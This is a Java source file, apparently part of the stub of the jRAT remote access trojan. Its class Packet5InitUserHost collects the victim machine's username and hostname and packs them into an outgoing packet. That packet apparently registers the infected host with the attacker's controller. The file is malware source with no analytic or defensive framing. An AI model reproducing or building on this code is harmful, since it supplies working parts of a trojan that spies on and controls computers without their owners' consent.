package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import io.jrat.common.utils.UserUtils;
import java.io.DataOutputStream;


public class Packet5InitUserHost extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String username = System.getProperty("user.name");
		String hostname = UserUtils.getHostname();
		
		sw.writeLine(username);
		sw.writeLine(hostname);
	}

	@Override
	public short getPacketId() {
		return (byte) 5;
	}
}